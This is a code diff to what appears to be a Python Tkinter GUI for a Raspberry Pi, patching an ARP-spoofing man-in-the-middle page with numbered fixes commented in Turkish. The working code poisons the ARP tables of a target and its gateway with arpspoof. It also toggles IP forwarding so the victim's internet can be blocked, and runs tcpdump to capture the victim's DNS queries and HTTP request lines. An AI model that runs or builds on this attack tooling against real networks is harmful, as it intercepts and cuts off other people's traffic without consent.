@@ -1907,6 +1907,8 @@ class ArpSpoofPage(tk.Frame):
         self._focus = "target"
         self.target_ip = ""
         self.gateway_ip = ""
+        self.iface = "wlan0"          # [FIX #4] runtime'da güncellenir
+        self._start_btn_lock = False  # [FIX #9] race koruması
 
         # --- Toolbar ---
         tb = tk.Frame(self, bg="#111111"); tb.place(x=0, y=0, width=480, height=30)
@@ -2047,6 +2049,7 @@ class ArpSpoofPage(tk.Frame):
         self.input_frame.place(x=0, y=30, width=480, height=290)
         self.btn_start_top.config(state=tk.NORMAL, text="START", bg="#005500")
         self.blocking = False
+        self._start_btn_lock = False  # [FIX #9]
         if hasattr(self, 'btn_block'):
             self.btn_block.config(text="BLOCK NET", bg="#aa0000")
 
@@ -2089,20 +2092,52 @@ class ArpSpoofPage(tk.Frame):
         self.target_entry.delete(0, tk.END)
         self.gateway_entry.delete(0, tk.END)
 
+    # [FIX #4] interface detection
+    def _detect_iface(self):
+        try:
+            r = subprocess.run("ip route | awk '/^default/ {print $5; exit}'",
+                              shell=True, capture_output=True, text=True, timeout=2)
+            if r.stdout.strip():
+                self.iface = r.stdout.strip()
+        except: pass
+        return self.iface
+
     def detect_gateway(self):
         try:
-            r = subprocess.run("ip route | grep default | awk '{print $3}'",
-                              shell=True, capture_output=True, text=True, timeout=3)
+            r = subprocess.run("ip route | awk '/^default/ {print $3; exit}'",
+                              shell=True, capture_output=True, text=True, timeout=2)
             gw = r.stdout.strip()
             if gw:
                 self.gateway_entry.delete(0, tk.END)
                 self.gateway_entry.insert(0, gw)
+            # [FIX #4] interface'i de güncelle
+            self._detect_iface()
         except: pass
+
+    # [FIX #2] sudo NOPASSWD kontrolü
+    def _sudo_ready(self):
+        r = subprocess.run("sudo -n true", shell=True,
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return r.returncode == 0
+
+    # [FIX #4 + #8] doğru IP/MAC okuma
+    def _ip_neigh(self, ip):
+        """IP'den MAC öğren (ARP tablosundan)."""
+        try:
+            r = subprocess.run(f"ip neigh show {ip}",
+                              shell=True, capture_output=True, text=True, timeout=2)
+            m = re.search(r'lladdr ([0-9a-f:]{17})', r.stdout)
+            return m.group(1) if m else None
+        except: return None
 
     # ============================================================
     # Start / Stop
     # ============================================================
     def start_spoof(self):
+        # [FIX #9] race koruması
+        if self._start_btn_lock or self.running:
+            return
+
         target = self.target_entry.get().strip()
         gateway = self.gateway_entry.get().strip()
         if not target or not gateway:
@@ -2112,7 +2147,19 @@ class ArpSpoofPage(tk.Frame):
                                      self.gateway_entry.config(bg="#222")))
             return
 
-        if subprocess.run("which arpspoof", shell=True, capture_output=True).returncode != 0:
+        # [FIX #12] target == gateway kontrolü
+        if target == gateway:
+            self.target_entry.config(bg="#500000")
+            self.gateway_entry.config(bg="#500000")
+            self.after(600, lambda: (self.target_entry.config(bg="#222"),
+                                     self.gateway_entry.config(bg="#222")))
+            return
+
+        # [FIX #4] interface detection
+        iface = self._detect_iface()
+
+        if subprocess.run("which arpspoof", shell=True,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
             self.show_mitm()
             self._clear_log()
             self.log("[!] arpspoof not found", "err")
@@ -2120,6 +2167,18 @@ class ArpSpoofPage(tk.Frame):
             self.after(3000, self.show_input)
             return
 
+        # [FIX #2] sudo kontrolü
+        if not self._sudo_ready():
+            self.show_mitm()
+            self._clear_log()
+            self.log("[!] sudo password required", "err")
+            self.log("[*] Run once in a terminal:", "sys")
+            self.log("    sudo -v", "data")
+            self.log("[*] or add NOPASSWD to /etc/sudoers.d/", "sys")
+            self.after(4000, self.show_input)
+            return
+
+        self._start_btn_lock = True
         self.running = True
         self.blocking = False
         self.target_ip = target
@@ -2129,41 +2188,53 @@ class ArpSpoofPage(tk.Frame):
             self.btn_block.config(text="BLOCK NET", bg="#aa0000")
         self.status_lbl.config(text="● MITM ACTIVE", bg="#aa0000")
         self._clear_log()
-        self.info_lbl.config(text=f"TGT: {target}  |  GW: {gateway}")
+        self.info_lbl.config(text=f"TGT: {target}  |  GW: {gateway}  |  IF: {iface}")
 
         self.log("[*] Starting ARP poisoning...", "sys")
         self.log(f"[*] Target:  {target}", "sys")
         self.log(f"[*] Gateway: {gateway}", "sys")
+        self.log(f"[*] Iface:   {iface}", "sys")
 
-        subprocess.run("sudo sysctl -w net.ipv4.ip_forward=1",
-                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        self.log("[+] IP forwarding ON", "ok")
+        # [FIX #3] IPv6 forwarding yerine ip6tables DROP
+        self._set_forward(1)
+        self.log("[+] IPv4 forwarding ON", "ok")
+        self.log("[i] ARP-only MITM — IPv6 traffic may bypass", "warn")
+        self.log("[i] Test target IPv6: curl -6 ifconfig.co", "sys")
 
+        # [FIX #1] p1 leak koruması — append pattern
+        self.processes = []
         try:
+
+            # [FIX #8] list form + start_new_session → sudo doğrudan group lideri
             p1 = subprocess.Popen(
-                f"sudo arpspoof -i wlan0 -t {target} {gateway}",
-                shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                ["sudo", "arpspoof", "-i", iface, "-t", target, gateway],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                 text=True, bufsize=1, start_new_session=True
             )
+            self.processes.append(p1)  # [FIX #1]
+
             p2 = subprocess.Popen(
-                f"sudo arpspoof -i wlan0 -t {gateway} {target}",
-                shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                ["sudo", "arpspoof", "-i", iface, "-t", gateway, target],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                 text=True, bufsize=1, start_new_session=True
             )
-            self.processes = [p1, p2]
+            self.processes.append(p2)  # [FIX #1]
+
             self.log("[+] ARP poisoning ACTIVE", "ok")
             self.log("[*] Use buttons below to inspect traffic", "sys")
             self.log("", "sys")
 
             def reader(proc, tag):
                 try:
-                    last = ""
                     for line in proc.stdout:
                         if not self.running: break
                         line = line.strip()
-                        if line and line != last:
-                            last = line
-                            self.log(f"[{tag}] {line[:68]}", "data")
+                        if not line: continue
+                        # [FIX #7] MAC/IP sadeleştir, tam göster
+                        m = re.search(r'arp (reply|request) ([\d.]+) is-at ([0-9a-f:]+)', line)
+                        if m:
+                            line = f"{m.group(1)} {m.group(2)} → {m.group(3)}"
+                        self.log(f"[{tag}] {line[:80]}", "data")
                 except: pass
 
             threading.Thread(target=reader, args=(p1, "T→G"), daemon=True).start()
@@ -2172,34 +2243,49 @@ class ArpSpoofPage(tk.Frame):
             self.log(f"[!] Error: {str(e)[:50]}", "err")
             self.stop_spoof()
 
+    # [FIX #3] IPv6 forwarding yerine ip6tables
     def _set_forward(self, state):
-        """IP forwarding'i aç/kapat. state: 1 veya 0."""
-        r = subprocess.run(
-            f"sudo sysctl -w net.ipv4.ip_forward={state}",
-            shell=True, capture_output=True, text=True
-        )
-        actual = subprocess.run(
-            "cat /proc/sys/net/ipv4/ip_forward",
-            shell=True, capture_output=True, text=True
-        ).stdout.strip()
-        self.log(f"    sysctl request: {state}, actual: {actual}", "sys")
-        if r.returncode != 0:
-            self.log(f"    sysctl err: {r.stderr.strip()[:60]}", "err")
+        """IPv4 forwarding aç/kapat; IPv6 target'ı ip6tables ile DROP et."""
+        if state == 1:
+            subprocess.run("sudo sysctl -w net.ipv4.ip_forward=1",
+                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+            # [YENİ] ip6tables var mı? Yoksa uyar, sessiz fail etme
+            has_ip6t = subprocess.run("which ip6tables", shell=True,
+                                      stdout=subprocess.DEVNULL,
+                                      stderr=subprocess.DEVNULL).returncode == 0
+            if has_ip6t:
+                subprocess.run("sudo ip6tables -A FORWARD -i %s -j DROP" % self.iface,
+                              shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run("sudo ip6tables -A FORWARD -o %s -j DROP" % self.iface,
+                              shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            else:
+                self.log("[!] ip6tables missing — IPv6 not blocked", "warn")
+                self.log("[*] Install: sudo apt install iptables", "sys")
+        else:
+            subprocess.run("sudo sysctl -w net.ipv4.ip_forward=0",
+                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            # -D komutları zaten hata verirse stderr'e düşer, DEVNULL; zararsız
+            subprocess.run("sudo ip6tables -D FORWARD -i %s -j DROP" % self.iface,
+                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run("sudo ip6tables -D FORWARD -o %s -j DROP" % self.iface,
+                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        v4 = subprocess.run("cat /proc/sys/net/ipv4/ip_forward",
+                           shell=True, capture_output=True, text=True).stdout.strip()
+        self.log(f"    ipv4_fwd={v4}  (request={state})", "sys")
 
     def toggle_block(self):
-        """Hedefin internet trafiğini kes/geri aç (ip_forward toggle)."""
         if not self.running:
             return
 
         if not self.blocking:
-            # BLOCK: forward kapat
             self._set_forward(0)
             self.blocking = True
             self.log("[!] Forwarding OFF — target internet BLOCKED", "err")
             self.btn_block.config(text="UNBLOCK", bg="#005500")
             self.status_lbl.config(text="● MITM ACTIVE — NET BLOCKED", bg="#cc8800")
         else:
-            # UNBLOCK: forward aç
             self._set_forward(1)
             self.blocking = False
             self.log("[+] Forwarding ON — target internet RESTORED", "ok")
@@ -2212,20 +2298,38 @@ class ArpSpoofPage(tk.Frame):
             return
         self.running = False
         self.log("[!] Stopping MITM...", "warn")
-        # BLOCK hâlâ aktifse geri aç (Pi'nin kendi bağlantısı zaten OUTPUT, etkilenmedi ama temiz olsun)
-        if self.blocking:
-            self._set_forward(1)
-            self.blocking = False
-            self.log("[-] Forwarding restored (was blocked)", "sys")
+
+        # [FIX #8] SIGINT gönder, kısa bekle
         for p in self.processes:
             try: os.killpg(os.getpgid(p.pid), signal.SIGINT)
             except: pass
+        for p in self.processes:
+            try: p.wait(timeout=1.5)
+            except: 
+                try: os.killpg(os.getpgid(p.pid), signal.SIGKILL)
+                except: pass
         self.processes = []
-        subprocess.run("sudo sysctl -w net.ipv4.ip_forward=0",
-                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        self.log("[-] IP forwarding OFF", "sys")
+
+        # [FIX #8] Elle ARP restore
+        self._restore_arp()
+
+        # [FIX #6] her durumda forwarding temizliği
+        self._set_forward(0)
+        self.blocking = False
+        self.log("[-] IPv4 forwarding OFF, IPv6 unblocked", "sys")
         self.log("[-] ARP tables recover in 30-60s", "warn")
         self.after(2000, self.show_input)
+
+    # [FIX #8] elle ARP restore
+    def _restore_arp(self):
+        """arpspoof SIGINT ile restore yapar; burada sadece ARP cache temizle."""
+        try:
+            # Kendi ARP cache'imizi temizle (gateway/target doğru MAC'lerini yeniden öğrensin)
+            subprocess.run(f"sudo ip neigh flush dev {self.iface}",
+                        shell=True, stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL, timeout=3)
+            self.log("[+] Local ARP cache flushed", "ok")
+        except: pass
 
     # ============================================================
     # MITM action buttons
@@ -2235,7 +2339,7 @@ class ArpSpoofPage(tk.Frame):
         self.log("[*] Scanning LAN hosts...", "sys")
         def run():
             try:
-                r = subprocess.run("ip -o -f inet addr show wlan0 | awk '{print $4}'",
+                r = subprocess.run(f"ip -o -f inet addr show {self.iface} | awk '{{print $4}}'",
                                   shell=True, capture_output=True, text=True, timeout=3)
                 subnet = r.stdout.strip()
                 if not subnet:
@@ -2264,7 +2368,7 @@ class ArpSpoofPage(tk.Frame):
         def run():
             try:
                 r = subprocess.run(
-                    "sudo timeout 10 tcpdump -i wlan0 -n 'udp port 53' -l 2>/dev/null | head -25",
+                    f"sudo timeout 10 tcpdump -i {self.iface} -n 'udp port 53' -l 2>/dev/null | head -25",
                     shell=True, capture_output=True, text=True, timeout=15
                 )
                 lines = [l.strip() for l in r.stdout.splitlines() if l.strip()]
@@ -2282,7 +2386,7 @@ class ArpSpoofPage(tk.Frame):
         def run():
             try:
                 r = subprocess.run(
-                    "sudo timeout 10 tcpdump -i wlan0 -n -A 'tcp port 80' -l 2>/dev/null "
+                    f"sudo timeout 10 tcpdump -i {self.iface} -n -A 'tcp port 80' -l 2>/dev/null "
                     "| grep -aE '^(GET|POST|Host:)' | head -20",
                     shell=True, capture_output=True, text=True, timeout=15
                 )
